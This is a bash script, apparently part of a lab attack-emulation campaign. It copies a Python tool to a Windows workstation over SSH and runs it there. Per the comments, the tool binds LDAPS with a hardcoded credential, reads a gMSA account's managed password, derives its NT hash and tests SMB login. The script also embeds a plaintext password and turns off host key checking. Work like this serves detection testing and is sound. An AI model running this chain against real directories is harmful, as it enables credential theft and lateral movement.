#!/usr/bin/env bash
# T024 — gMSA extraction from ws01 as eng_cloud (ACE#10 ReadGMSAPassword)
# Chain: LDAPS bind as eng_cloud -> read msDS-ManagedPassword for gmsaTools$ ->
#        decode blob -> compute NT hash (pure MD4) -> validate SMB auth as gmsaTools$
# Entry credential: eng_cloud / Cl0ud_Eng! (ACE#10 configured in 05-ad-attack-surface.yml)
# NOTE: supersedes the old GoldenGMSA/cache/gmsainfo path (chief_command) — the
#       configured attack surface is ACE#10 eng_cloud ReadGMSAPassword.
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB="${SCRIPT_DIR}/../lib"
source "${LIB}/campaign-a-common.sh"

CASE_ID="CADRE-T024-GMSA-${CASE_DATE:-$(date -u +%Y%m%d)}"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)

echo "=== T024 gMSA extraction | ${CASE_ID} | T0=${T0} ==="

# Push ws01-native script and run it as analyst_t1 (session user on ws01);
# the script itself binds LDAPS as eng_cloud with explicit creds in-process.
scp -i "${WS01_SSH_KEY:-$HOME/.ssh/cadre-ws01-key}" -o StrictHostKeyChecking=no \
  "${SCRIPT_DIR}/../../windows/t024-gmsa-extract.py" \
  analyst_t1@192.168.77.62:C:/Tools/cadre-attack/ 2>&1

ssh -i "${WS01_SSH_KEY:-$HOME/.ssh/cadre-ws01-key}" -o StrictHostKeyChecking=no \
  analyst_t1@192.168.77.62 'python C:/Tools/cadre-attack/t024-gmsa-extract.py'

cadre_export "${CASE_ID}" T024 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T024 run complete ==="
